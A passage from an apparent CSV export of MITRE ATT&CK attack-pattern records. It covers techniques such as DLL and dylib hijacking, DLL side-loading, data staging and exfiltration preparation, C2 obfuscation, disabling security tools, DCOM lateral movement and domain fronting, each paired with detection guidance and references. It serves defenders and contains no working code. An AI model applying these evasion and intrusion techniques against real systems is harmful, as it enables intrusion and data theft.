Permissions Required: User, Administrator, SYSTEM

System Requirements: Ability to add a DLL, manifest file, or .local file, directory, or junction.

Contributors: Stefan Kanthak, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1038', 'external_id': 'T1038'}, {'source_name': 'Microsoft DLL Search', 'description': 'Microsoft. (n.d.). Dynamic-Link Library Search Order. Retrieved November 30, 2014.', 'url': 'http://msdn.microsoft.com/en-US/library/ms682586'}, {'source_name': 'OWASP Binary Planting', 'description': 'OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.', 'url': 'https://www.owasp.org/index.php/Binary%20planting'}, {'source_name': 'Microsoft 2269637', 'description': 'Microsoft. (2010, August 22). Microsoft Security Advisory 2269637 Released. Retrieved December 5, 2014.', 'url': 'http://blogs.technet.com/b/msrc/archive/2010/08/21/microsoft-security-advisory-2269637-released.aspx'}, {'source_name': 'Microsoft DLL Redirection', 'description': 'Microsoft. (n.d.). Dynamic-Link Library Redirection. Retrieved December 5, 2014.', 'url': 'http://msdn.microsoft.com/en-US/library/ms682600'}, {'source_name': 'Microsoft Manifests', 'description': 'Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.', 'url': 'https://msdn.microsoft.com/en-US/library/aa375365'}, {'source_name': 'Mandiant Search Order', 'description': 'Mandiant. (2010, August 31). DLL Search Order Hijacking Revisited. Retrieved December 5, 2014.', 'url': 'https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'DLL monitoring', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak', 'Travis Smith, Tripwire']","['User', 'Administrator', 'SYSTEM']","['Ability to add a DLL, manifest file, or .local file, directory, or junction.']","","","['Process whitelisting']"
"attack-pattern","attack-pattern--b2001907-166b-4d71-bb3c-9d26c871de09","2017-05-31T21:30:58.007Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","DLL Side-Loading","Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)

Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.

Detection: Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.

Platforms: Windows

Data Sources: Process use of network, Process monitoring, Loaded DLLs

Defense Bypassed: Anti-virus, Process whitelisting","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1073', 'external_id': 'T1073'}, {'source_name': 'MSDN Manifests', 'description': 'Microsoft. (n.d.). Manifests. Retrieved June 3, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/aa375365'}, {'source_name': 'Stewart 2014', 'description': 'Stewart, A. (2014). DLL SIDE-LOADING: A Thorn in the Side of the Anti-Virus Industry. Retrieved November 12, 2014.', 'url': 'https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process use of network', 'Process monitoring', 'Loaded DLLs']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'Process whitelisting']"
"attack-pattern","attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4","2017-05-31T21:30:19.338Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data Compressed","An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.

Detection: Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.

If the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers. (Citation: Wikipedia File Header Signatures)

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring

Requires Network: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1002', 'external_id': 'T1002'}, {'source_name': 'Wikipedia File Header Signatures', 'description': 'Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.', 'url': 'https://en.wikipedia.org/wiki/List%20of%20file%20signatures'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","False",""
"attack-pattern","attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f","2017-05-31T21:31:43.540Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data Encoding","Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Process use of network, Process Monitoring, Network protocol analysis

Permissions Required: User

Requires Network: Yes

Contributors: Itzik Kotler, SafeBreach","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1132', 'external_id': 'T1132'}, {'source_name': 'Wikipedia Binary-to-text Encoding', 'description': 'Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.', 'url': 'https://en.wikipedia.org/wiki/Binary-to-text%20encoding'}, {'source_name': 'Wikipedia Character Encoding', 'description': 'Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.', 'url': 'https://en.wikipedia.org/wiki/Character%20encoding'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Itzik Kotler, SafeBreach']","","","","True",""
"attack-pattern","attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638","2017-05-31T21:30:30.260Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data Encrypted","Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.

Other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol

Detection: Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. 

A process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. 

Network traffic may also be analyzed for entropy to determine if encrypted data is being transmitted. (Citation: Zhang 2013) If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers. (Citation: Wikipedia File Header Signatures)

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring

Requires Network: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1022', 'external_id': 'T1022'}, {'source_name': 'Zhang 2013', 'description': 'Zhang, H., Papadopoulos, C., & Massey, D. (2013, April). Detecting encrypted botnet traffic. Retrieved August 19, 2015.', 'url': 'http://www.netsec.colostate.edu/~zhang/DetectingEncryptedBotnetTraffic.pdf'}, {'source_name': 'Wikipedia File Header Signatures', 'description': 'Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.', 'url': 'https://en.wikipedia.org/wiki/List%20of%20file%20signatures'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","False",""
"attack-pattern","attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842","2017-05-31T21:30:18.931Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data Obfuscation","Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, commingling legitimate traffic with C2 communications traffic, or using a non-standard data encoding system, such as a modified Base64 encoding for the message body of an HTTP request.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Process use of network, Process monitoring, Network protocol analysis

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1001', 'external_id': 'T1001'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e","2017-05-31T21:30:58.938Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data Staged","Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Data Compressed or Data Encrypted.

Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.

Detection: Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1074', 'external_id': 'T1074'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process command-line parameters']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd","2017-05-31T21:30:34.523Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data Transfer Size Limits","An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1030', 'external_id': 'T1030'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5","2017-05-31T21:30:20.537Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data from Local System","Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.

Adversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a Command-Line Interface, such as cmd, which has functionality to interact with the file system to gather information. Some adversaries may also use Automated Collection on the local system.

Detection: Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters

System Requirements: Privileges to access certain files and directories","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1005', 'external_id': 'T1005'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process command-line parameters']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Privileges to access certain files and directories']","","",""
"attack-pattern","attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c","2017-05-31T21:30:41.022Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data from Network Shared Drive","Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration.

Adversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.

Detection: Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters

System Requirements: Privileges to access network shared drive","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1039', 'external_id': 'T1039'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process command-line parameters']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Privileges to access network shared drive']","","",""
"attack-pattern","attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec","2017-05-31T21:30:31.584Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Data from Removable Media","Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.

Adversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. Some adversaries may also use Automated Collection on removable media.

Detection: Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters

System Requirements: Privileges to access removable media drive and files","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1025', 'external_id': 'T1025'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Process command-line parameters']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Privileges to access removable media drive and files']","","",""
"attack-pattern","attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Deobfuscate/Decode Files or Information","Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, Scripting, PowerShell, or by using utilities present on the system.

One such example is use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)

Detection: Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as certutil.

Platforms: Windows

Data Sources: File monitoring, Process Monitoring, Process command-line parameters

Defense Bypassed: Anti-virus, Host intrusion prevention systems, Signature-based detection, Network intrusion detection system

Permissions Required: User

Contributors: Matthew Demaske, Adaptforward","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1140', 'external_id': 'T1140'}, {'source_name': 'Malwarebytes Targeted Attack against Saudi Arabia', 'description': 'Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.', 'url': 'https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Matthew Demaske, Adaptforward']","","","","","['Anti-virus', 'Host intrusion prevention systems', 'Signature-based detection', 'Network intrusion detection system']"
"attack-pattern","attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044","2017-05-31T21:31:07.958Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Disabling Security Tools","Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.

Detection: Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring, Anti-virus, File monitoring, Services, Windows Registry, Process command-line parameters

Defense Bypassed: Anti-virus, File monitoring, Host intrusion prevention systems, Signature-based detection, Log analysis","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1089', 'external_id': 'T1089'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']"
"attack-pattern","attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Distributed Component Object Model","Windows Distributed Component Object Model (DCOM) is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology. COM is a component of the Windows application programming interface (API) that enables interaction between software objects. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).

Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM) ACL (Citation: Microsoft Process Wide Com Keys) (Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.

Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods. (Citation: Enigma MMC20 COM Jan 2017) (Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.

Detection: Monitor for COM objects loading DLLs and other modules not typically associated with the application. (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017)

Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.

Monitor for influx of Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.

Platforms: Windows

Data Sources: API monitoring, Authentication logs, DLL monitoring, Packet capture, Process monitoring, Windows Registry, Windows event logs

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1175', 'external_id': 'T1175'}, {'source_name': 'Microsoft COM', 'description': 'Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx'}, {'source_name': 'Microsoft Process Wide Com Keys', 'description': 'Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.', 'url': 'https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx'}, {'source_name': 'Microsoft System Wide Com Keys', 'description': 'Microsoft. (n.d.). Registry Values for System-Wide Security. Retrieved November 21, 2017.', 'url': 'https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx'}, {'source_name': 'Enigma Outlook DCOM Lateral Movement Nov 2017', 'description': ""Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017."", 'url': 'https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/'}, {'source_name': 'Enigma MMC20 COM Jan 2017', 'description': 'Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.', 'url': 'https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/'}, {'source_name': 'Enigma DCOM Lateral Movement Jan 2017', 'description': 'Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.', 'url': 'https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/'}, {'source_name': 'Enigma Excel DCOM Sept 2017', 'description': 'Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.', 'url': 'https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/'}, {'source_name': 'Cyberreason DCOM DDE Lateral Movement Nov 2017', 'description': 'Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.', 'url': 'https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Authentication logs', 'DLL monitoring', 'Packet capture', 'Process monitoring', 'Windows Registry', 'Windows event logs']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Domain Fronting","Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.

Detection: If SSL inspection is in place, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blacklist or whitelist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)

Platforms: Linux, macOS, Windows

Data Sources: SSL/TLS inspection

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1172', 'external_id': 'T1172'}, {'source_name': 'Fifield Blocking Resistent Communication through domain fronting 2015', 'description': 'David Fifield, Chang Lan, Rod Hynes, Percy Wegmann, and Vern Paxson. (2015). Blocking-resistant communication through domain fronting. Retrieved November 20, 2017.', 'url': 'http://www.icir.org/vern/papers/meek-PETS-2015.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['SSL/TLS inspection']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--aa8bfbc9-78dc-41a4-a03b-7453e0fdccda","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Dylib Hijacking","macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.

A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)
If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.

Detection: Objective-See's Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process.

Platforms: macOS

Data Sources: File monitoring

Effective Permissions: Administrator, root

